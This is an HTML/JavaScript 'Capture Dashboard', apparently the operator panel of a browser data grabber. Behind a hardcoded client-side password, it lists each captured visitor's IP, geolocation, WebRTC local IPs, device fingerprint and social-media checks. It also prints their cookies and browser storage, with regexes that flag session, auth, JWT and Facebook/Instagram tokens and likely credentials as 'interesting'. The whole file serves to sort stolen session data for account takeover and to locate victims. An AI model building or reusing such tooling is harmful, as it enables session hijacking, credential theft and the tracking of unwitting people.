<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Capture Dashboard</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #0a0a0a; color: #e0e0e0; font-family: 'Segoe UI', system-ui, sans-serif; padding: 20px; }
  .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
  h1 { font-size: 1.5rem; color: #00ff88; }
  .controls { display: flex; gap: 8px; flex-wrap: wrap; }
  input, button { padding: 8px 14px; border: 1px solid #333; background: #1a1a1a; color: #e0e0e0; border-radius: 4px; font-size: 0.85rem; }
  input:focus { outline: none; border-color: #00ff88; }
  button { cursor: pointer; background: #2a2a2a; transition: background 0.2s; }
  button:hover { background: #3a3a3a; }
  button.danger { background: #5a1a1a; border-color: #a33; }
  button.danger:hover { background: #7a2a2a; }
  .stats { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
  .stat { background: #141414; border: 1px solid #222; padding: 12px 20px; border-radius: 6px; }
  .stat span { color: #00ff88; font-size: 1.4rem; font-weight: bold; }
  .card { background: #141414; border: 1px solid #222; border-radius: 6px; padding: 16px; margin-bottom: 12px; }
  .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; flex-wrap: wrap; gap: 6px; }
  .card-id { color: #00ff88; font-family: monospace; font-size: 0.8rem; }
  .card-time { color: #888; font-size: 0.8rem; }
  .card-ip { color: #ffaa00; font-family: monospace; }
  .card-body { display: none; margin-top: 10px; }
  .card-body.open { display: block; }
  .card-body pre { background: #0a0a0a; padding: 12px; border-radius: 4px; font-size: 0.75rem; overflow-x: auto; max-height: 400px; }
  .toggle-btn { cursor: pointer; color: #00ff88; background: none; border: 1px solid #333; padding: 4px 10px; border-radius: 3px; font-size: 0.8rem; }
  .tag { display: inline-block; background: #1a3a2a; color: #00ff88; padding: 2px 8px; border-radius: 3px; font-size: 0.7rem; margin-right: 4px; }
  .empty { text-align: center; padding: 60px; color: #555; }
  .loading { text-align: center; padding: 40px; color: #888; }
  .error { color: #ff5555; text-align: center; padding: 40px; }
  .browser-info { display: flex; gap: 8px; flex-wrap: wrap; margin: 4px 0; }
  .link-tag { background: #2a1a1a; border-color: #ff6644; }
  .section { margin: 8px 0; border: 1px solid #1a1a1a; border-radius: 6px; overflow: hidden; }
  .section-title { background: #0d0d0d; padding: 6px 12px; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; color: #555; border-bottom: 1px solid #1a1a1a; }
  .section-body { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1px; background: #1a1a1a; }
  .field { background: #0f0f0f; padding: 8px 12px; }
  .field-label { color: #555; font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px; }
  .field-value { font-size: 0.85rem; word-break: break-all; }
  .field-value.ip { color: #ffaa00; font-family: monospace; font-size: 1.1rem; font-weight: bold; }
  .field-value.high { color: #00ff88; }
  .field-value.warn { color: #ffcc00; }
  .field-value.info { color: #77ddff; }
  .field-value.pink { color: #ff77ff; }
  .field-value.green { color: #aaffaa; }
  .field-value.red { color: #ff5555; }
  .field-value.truncate { max-height: 60px; overflow-y: auto; }
  .field-value pre { background: none; padding: 0; margin: 0; font-size: 0.8rem; max-height: none; }
  .login-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 80vh; }
  .login-screen h1 { margin-bottom: 20px; }
  .login-screen input { text-align: center; font-size: 1.2rem; padding: 12px 20px; width: 200px; }
  .login-screen .error-msg { color: #ff5555; margin-top: 10px; font-size: 0.85rem; }
  #dashboard { display: none; }
</style>
</head>
<body>
<div id="loginScreen" class="login-screen">
  <h1>// Admin Access</h1>
  <input type="password" id="loginInput" placeholder="Enter password" onkeydown="if(event.key==='Enter')checkLogin()" autofocus />
  <div style="margin-top:12px"><button onclick="checkLogin()">Unlock</button></div>
  <div id="loginError" class="error-msg"></div>
</div>

<div id="dashboard">
  <div class="header">
    <h1>// Capture Dashboard</h1>
    <div class="controls">
      <button onclick="loadData()">Refresh</button>
      <button class="danger" onclick="clearData()">Clear All</button>
    </div>
  </div>
  <div id="stats" class="stats"></div>
  <div id="content"><div class="loading">Loading...</div></div>
</div>

<script>
const ADMIN_PASS = '2262';

function checkLogin() {
  const input = document.getElementById('loginInput');
  const errEl = document.getElementById('loginError');
  if (input.value === ADMIN_PASS) {
    document.getElementById('loginScreen').style.display = 'none';
    document.getElementById('dashboard').style.display = 'block';
    loadData();
  } else {
    errEl.textContent = 'Wrong password';
    input.value = '';
    input.focus();
  }
}

async function loadData() {
  document.getElementById('content').innerHTML = '<div class="loading">Loading...</div>';
  try {
    const res = await fetch(`/api/captures?key=${ADMIN_PASS}`);
    if (!res.ok) {
      let detail = '';
      try { const e = await res.json(); detail = e.detail || e.error || ''; } catch(e2) {}
      if (res.status === 401) throw new Error('Unauthorized - wrong key');
      throw new Error(`HTTP ${res.status}${detail ? ': ' + detail : ''}`);
    }
    const data = await res.json();
    render(data);
  } catch (err) {
    document.getElementById('content').innerHTML = `<div class="error">${err.message}</div>`;
  }
}

async function clearData() {
  if (!confirm('Clear ALL captured data?')) return;
  try {
    const res = await fetch('/api/clear', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key: ADMIN_PASS })
    });
    if (!res.ok) throw new Error('Clear failed');
    loadData();
  } catch (err) {
    alert(err.message);
  }
}

function analyzeCookies(cookieStr) {
  if (!cookieStr || cookieStr === 'none') return [];
  return cookieStr.split(';').map(c => {
    const parts = c.trim().split('=');
    const name = parts[0];
    const val = parts.slice(1).join('=');
    const lower = name.toLowerCase();
    let interesting = false;
    let reason = '';
    if (/sess|token|auth|login|sid|jwt|bearer|csrf|xcsrf|sessionid|remember|userid|identity/.test(lower)) {
      interesting = true; reason = 'Auth/session token';
    }
    if (/fb|facebook|instagram|ig_|tw_|twitter|google|ga_|_gid/.test(lower)) {
      interesting = true; reason = 'Social media cookie';
    }
    if (/admin|root|pass|key|secret/.test(lower)) {
      interesting = true; reason = 'Potential credential';
    }
    if (/__cf|cloudflare|akamai|incap|visitor/.test(lower)) {
      interesting = true; reason = 'CDN/security cookie';
    }
    return { name, value: val, interesting, reason };
  });
}

function render(data) {
  document.getElementById('stats').innerHTML = `<div class="stat">Total captures: <span>${data.total}</span></div>`;
  const container = document.getElementById('content');
  if (data.total === 0) {
    container.innerHTML = '<div class="empty">No captures yet</div>';
    return;
  }
  container.innerHTML = data.captures.map(c => {
    const id = c.id || '?';
    const time = c.receivedAt || c.timestamp || '?';
    const ip = c.ip || '?';
    const ua = c.userAgent || '';
    const os = getOS(ua);
    const is = c.screen || {};
    const win = c.window || {};
    const conn = c.connection;
    const bat = c.battery;
    const wg = c.webgl || {};
    const fonts = c.fonts;
    const ls = c.localStorage;
    const ss = c.sessionStorage;
    const cookies = c.cookies;
    const geo = c.geo || {};
    const social = c.socialChecks || {};
    const localIps = c.localIps || [];
    const analyzed = analyzeCookies(cookies);
    const interestingCookies = analyzed.filter(x => x.interesting);

    function f(label, value, cls) {
      if (value === undefined || value === null || value === '' || value === '?' || value === 'unknown') return '';
      return `<div class="field"><div class="field-label">${label}</div><div class="field-value${cls ? ' ' + cls : ''}">${value}</div></div>`;
    }

    // === LOCATION (top priority) ===
    let locSection = '';
    if (geo.country || geo.city) {
      locSection = `<div class="section"><div class="section-title" style="color:#ffaa00;font-weight:bold">Location</div><div class="section-body">`;
      if (geo.country) locSection += f('Country', `${geo.country}${geo.countryCode ? ' (' + geo.countryCode + ')' : ''}`, 'ip');
      if (geo.city) locSection += f('City', geo.city, 'high');
      if (geo.region) locSection += f('Region', geo.region);
      if (geo.zip) locSection += f('ZIP', geo.zip);
      if (geo.lat && geo.lon) locSection += f('Coordinates', `${geo.lat}, ${geo.lon}`);
      if (geo.isp) locSection += f('ISP', geo.isp, 'info');
      if (geo.org) locSection += f('Organization', geo.org);
      if (geo.as) locSection += f('ASN', geo.as);
      locSection += `</div></div>`;
    }

    // === Network section ===
    let netSection = `<div class="section"><div class="section-title">Network</div><div class="section-body">`;
    netSection += f('IP Address', ip, 'ip');
    if (localIps.length > 0) netSection += f('Local IPs (WebRTC)', localIps.join(', '), 'warn');
    netSection += f('Connection Type', conn && conn !== 'unknown' ? `${conn.effectiveType || '?'} (${conn.downlink || '?'} Mbps, RTT: ${conn.rtt || '?'}ms)` : null, 'high');
    netSection += f('Data Saver', conn && conn !== 'unknown' ? (conn.saveData ? 'On' : 'Off') : null);
    netSection += f('Referrer', c.referrer && c.referrer !== 'direct' ? c.referrer : null);
    netSection += `</div></div>`;

    // === System section ===
    let sysSection = `<div class="section"><div class="section-title">System</div><div class="section-body">`;
    sysSection += f('OS', os, 'high');
    sysSection += f('Platform', c.platform);
    sysSection += f('CPU Cores', c.hardwareConcurrency, 'info');
    sysSection += f('Device Memory', c.deviceMemory ? c.deviceMemory + ' GB' : null, 'info');
    sysSection += f('Screen', is.width && is.height ? `${is.width}x${is.height}` : null);
    sysSection += f('Window Size', win.innerWidth && win.innerHeight ? `${win.innerWidth}x${win.innerHeight}` : null);
    sysSection += f('Pixel Ratio', win.devicePixelRatio);
    sysSection += f('Timezone', c.timezone, 'warn');
    sysSection += f('UTC Offset', c.timezoneOffset !== undefined ? `UTC${c.timezoneOffset > 0 ? '-' : '+'}${Math.abs(c.timezoneOffset/60)}` : null);
    sysSection += `</div></div>`;

    // === Browser section ===
    let brSection = `<div class="section"><div class="section-title">Browser</div><div class="section-body">`;
    brSection += f('User Agent', ua.length > 80 ? ua.slice(0,80) + '...' : ua);
    brSection += f('Language', c.language, 'high');
    brSection += f('Languages', c.languages ? c.languages.join(', ') : null);
    brSection += f('Cookies Enabled', c.cookiesEnabled !== undefined ? (c.cookiesEnabled ? 'Yes' : 'No') : null, c.cookiesEnabled ? 'high' : 'red');
    brSection += f('Do Not Track', c.doNotTrack);
    brSection += f('Battery', bat && bat !== 'unknown' ? `${Math.round(bat.level*100)}%${bat.charging ? ' (charging)' : ''}` : null, 'info');
    brSection += `</div></div>`;

    // === Social Media Checks ===
    let socSection = `<div class="section"><div class="section-title" style="color:#ff6644">Social Media</div><div class="section-body">`;
    if (social.cookieKeywords) {
      socSection += f('FB/IG Keywords in Cookies', Object.entries(social.cookieKeywords).filter(([k,v]) => v).map(([k]) => k).join(', ') || 'none detected');
    }
    if (social.instagram) {
      socSection += f('Instagram Reachable', social.instagram.reachable ? 'Yes' : 'No', social.instagram.reachable ? 'high' : '');
      if (social.instagram.note) socSection += f('Instagram Note', social.instagram.note);
    }
    if (social.facebook) {
      socSection += f('Facebook Reachable', social.facebook.reachable ? 'Yes' : 'No', social.facebook.reachable ? 'high' : '');
      if (social.facebook.note) socSection += f('Facebook Note', social.facebook.note);
    }
    socSection += `</div></div>`;

    // === GPU & Fonts ===
    let gfSection = '';
    if ((wg.unmaskedRenderer && wg.unmaskedRenderer !== 'n/a') || (fonts && fonts.length > 0)) {
      gfSection = `<div class="section"><div class="section-title">Fingerprinting</div><div class="section-body">`;
      if (wg.unmaskedRenderer && wg.unmaskedRenderer !== 'n/a') {
        gfSection += f('GPU', wg.unmaskedRenderer, 'info');
        gfSection += f('GPU Vendor', wg.unmaskedVendor !== 'n/a' ? wg.unmaskedVendor : null);
      }
      if (fonts && fonts.length > 0) {
        gfSection += f('Installed Fonts', fonts.slice(0,12).join(', ') + (fonts.length > 12 ? ` (+${fonts.length-12} more)` : ''), 'green');
      }
      gfSection += `</div></div>`;
    }

    // === COOKIES with analysis ===
    let ckSection = '';
    if (cookies && cookies !== 'none') {
      ckSection = `<div class="section"><div class="section-title" style="color:#ffcc00;font-weight:bold">Cookies (${analyzed.length} total)</div><div class="section-body">`;
      if (interestingCookies.length > 0) {
        ckSection += `<div class="field"><div class="field-label" style="color:#ff5555">&#9654; Interesting Cookies Found (${interestingCookies.length})</div></div>`;
        interestingCookies.forEach(ck => {
          ckSection += `<div class="field"><div class="field-label" style="color:#ffaa00">${ck.name} <span style="color:#ff5555;font-size:0.6rem">[${ck.reason}]</span></div><div class="field-value warn">${ck.value.length > 100 ? ck.value.slice(0,100) + '...' : ck.value}</div></div>`;
        });
      } else {
        ckSection += `<div class="field"><div class="field-label">No interesting cookies detected</div></div>`;
      }
      ckSection += `</div></div>`;
    }

    // === localStorage / sessionStorage ===
    let stSection = '';
    if ((ls && ls !== 'empty' && typeof ls === 'object') || (ss && ss !== 'empty' && typeof ss === 'object')) {
      stSection = `<div class="section"><div class="section-title" style="color:#ff77ff;font-weight:bold">Browser Storage</div><div class="section-body">`;
      if (ls && ls !== 'empty' && typeof ls === 'object') {
        const entries = Object.entries(ls);
        stSection += `<div class="field"><div class="field-label" style="color:#ff77ff">localStorage (${entries.length} keys)</div></div>`;
        entries.forEach(([k, v]) => {
          const val = typeof v === 'string' ? v : JSON.stringify(v);
          const isInteresting = /token|auth|sess|key|secret|pass|fb|ig_|acc|user|email/.test(k.toLowerCase());
          stSection += `<div class="field"><div class="field-label" style="color:${isInteresting ? '#ffaa00' : '#888'}">${k}</div><div class="field-value pink truncate">${val.length > 150 ? val.slice(0,150) + '...' : val}</div></div>`;
        });
      }
      if (ss && ss !== 'empty' && typeof ss === 'object') {
        const entries = Object.entries(ss);
        stSection += `<div class="field"><div class="field-label" style="color:#ff77ff">sessionStorage (${entries.length} keys)</div></div>`;
        entries.forEach(([k, v]) => {
          const val = typeof v === 'string' ? v : JSON.stringify(v);
          stSection += `<div class="field"><div class="field-label" style="color:#888">${k}</div><div class="field-value pink truncate">${val.length > 150 ? val.slice(0,150) + '...' : val}</div></div>`;
        });
      }
      stSection += `</div></div>`;
    }

    return `<div class="card">
      <div class="card-header">
        <span><span class="card-id">${id}</span> <span class="card-ip">${ip}</span></span>
        <span>
          <span class="card-time">${new Date(time).toLocaleString()}</span>
          <button class="toggle-btn" onclick="toggle(this)">Show raw JSON</button>
        </span>
      </div>
      ${locSection}
      ${netSection}
      ${sysSection}
      ${brSection}
      ${socSection}
      ${gfSection}
      ${ckSection}
      ${stSection}
      <div class="card-body"><pre>${JSON.stringify(c, null, 2)}</pre></div>
    </div>`;
  }).join('');
}

function toggle(btn) {
  const body = btn.closest('.card').querySelector('.card-body');
  body.classList.toggle('open');
  btn.textContent = body.classList.contains('open') ? 'Collapse' : 'Expand';
}

function getOS(ua) {
  if (!ua) return '';
  if (ua.includes('Windows')) return 'Windows';
  if (ua.includes('Mac OS')) return 'macOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  return '';
}


</script>
</body>
</html>
